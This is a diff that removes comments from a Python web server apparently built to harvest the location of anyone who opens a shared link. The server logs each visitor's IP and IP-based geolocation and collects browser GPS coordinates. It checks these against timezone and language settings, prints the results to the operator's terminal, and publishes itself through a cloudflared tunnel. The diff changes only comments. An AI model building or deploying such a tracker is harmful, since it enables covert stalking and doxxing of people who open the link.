@@ -14,10 +14,6 @@ import secrets
 import math
 
 
-# ==================================================
-# CONFIGURATION
-# ==================================================
-
 HOST = "0.0.0.0"
 PORT = 5000
 
@@ -26,21 +22,15 @@ BASE_DIR = Path(__file__).resolve().parent
 SESSION_TIMEOUT = 1800
 MAX_REQUEST_SIZE = 16384
 
-# Temporary visitor sessions
 visitor_sessions = {}
 session_lock = threading.Lock()
 
-
-# ==================================================
-# IP GEOLOCATION
-# ==================================================
 
 def get_ip_location(ip_address):
 
     try:
         ip = ipaddress.ip_address(ip_address)
 
-        # Skip private, reserved and local addresses
         if not ip.is_global:
             return None
 
@@ -166,19 +156,10 @@ def locale_comparison(language, browser_timezone, ip_location):
     )
 
 
-# ==================================================
-# HTTP REQUEST HANDLER
-# ==================================================
-
 class VisitorHandler(SimpleHTTPRequestHandler):
 
     def log_message(self, format, *args):
-        # Suppress default HTTP access logs
         pass
-
-    # --------------------------------------------------
-    # RESPONSE HELPERS
-    # --------------------------------------------------
 
     def send_json(self, data, status=200, extra_headers=None):
 
@@ -208,10 +189,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(response)
 
-    # --------------------------------------------------
-    # SESSION HELPERS
-    # --------------------------------------------------
-
     def get_session_id(self):
 
         cookie = SimpleCookie()
@@ -227,7 +204,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
 
     def get_client_ip(self):
 
-        # Cloudflare provides this header when proxied
         cloudflare_ip = self.headers.get("CF-Connecting-IP")
 
         if cloudflare_ip:
@@ -240,15 +216,10 @@ class VisitorHandler(SimpleHTTPRequestHandler):
 
         return self.client_address[0]
 
-    # ==================================================
-    # GET REQUESTS
-    # ==================================================
-
     def do_GET(self):
 
         path = urlsplit(self.path).path
 
-        # Serve frontend
         if path == "/":
 
             index_file = BASE_DIR / "index.html"
@@ -276,17 +247,12 @@ class VisitorHandler(SimpleHTTPRequestHandler):
 
             return
 
-        # Track visitor
         if path == "/track":
 
             self.track_visitor()
             return
 
         self.send_error(404, "Route not found")
-
-    # --------------------------------------------------
-    # VISITOR TRACKING
-    # --------------------------------------------------
 
     def track_visitor(self):
 
@@ -296,15 +262,12 @@ class VisitorHandler(SimpleHTTPRequestHandler):
             "%Y-%m-%d %H:%M:%S"
         )
 
-        # Obtain rough IP-based location
         ip_location = get_ip_location(ip_address)
 
-        # Generate a unique visitor session
         session_id = secrets.token_urlsafe(32)
 
         with session_lock:
 
-            # Remove expired sessions
             current_time = datetime.now().timestamp()
 
             expired = [
@@ -322,7 +285,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
                 "created_at": current_time
             }
 
-        # Send session cookie to browser
         self.send_json(
             {"status": "visitor_recorded"},
             200,
@@ -335,10 +297,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
             }
         )
 
-    # ==================================================
-    # POST REQUESTS
-    # ==================================================
-
     def do_POST(self):
 
         path = urlsplit(self.path).path
@@ -350,15 +308,10 @@ class VisitorHandler(SimpleHTTPRequestHandler):
 
         self.send_error(404, "Route not found")
 
-    # --------------------------------------------------
-    # RECEIVE BROWSER GPS DATA
-    # --------------------------------------------------
-
     def handle_location(self):
 
         try:
 
-            # Read request body
             content_length = int(
                 self.headers.get("Content-Length", "0")
             )
@@ -383,7 +336,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
                 )
                 return
 
-            # Retrieve visitor session
             session_id = self.get_session_id()
 
             with session_lock:
@@ -404,13 +356,11 @@ class VisitorHandler(SimpleHTTPRequestHandler):
 
                 return
 
-            # Visitor information
             ip_address = visitor["ip"]
             timestamp = visitor["timestamp"]
 
             ip_location = visitor["ip_location"]
 
-            # Browser GPS information
             gps_status = coords.get(
                 "status",
                 "unavailable"
@@ -514,7 +464,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
                 else "Unavailable"
             )
 
-            # IP-based location
             ip_link = (
                 ip_location.get("map_link")
                 if ip_location else None
@@ -576,10 +525,6 @@ class VisitorHandler(SimpleHTTPRequestHandler):
                 else "GRANTED"
             )
 
-            # ==================================================
-            # UNIFIED TERMINAL OUTPUT
-            # ==================================================
-
             log_entry = f"""------
 
 VISITOR DETECTED [{timestamp}]
@@ -615,10 +560,8 @@ VISITOR DETECTED [{timestamp}]
 
 ------"""
 
-            # Display in terminal
             print(log_entry, flush=True)
 
-            # Send successful response
             self.send_json({
                 "status": "ok"
             })
@@ -647,10 +590,6 @@ VISITOR DETECTED [{timestamp}]
                 500
             )
 
-
-# ==================================================
-# CLOUDFLARED TUNNEL AUTOMATION
-# ==================================================
 
 def start_cloudflared_tunnel(port):
 
@@ -698,10 +637,6 @@ def start_cloudflared_tunnel(port):
     return process
 
 
-# ==================================================
-# MAIN SERVER
-# ==================================================
-
 class VisitorServer(ThreadingHTTPServer):
 
     allow_reuse_address = True
@@ -719,7 +654,6 @@ if __name__ == "__main__":
 
     try:
 
-        # Start Cloudflare tunnel
         try:
 
             tunnel = start_cloudflared_tunnel(PORT)
@@ -738,7 +672,6 @@ if __name__ == "__main__":
                 f"[!] {error}"
             )
 
-        # Start HTTP server
         server = VisitorServer(
             (HOST, PORT),
             VisitorHandler
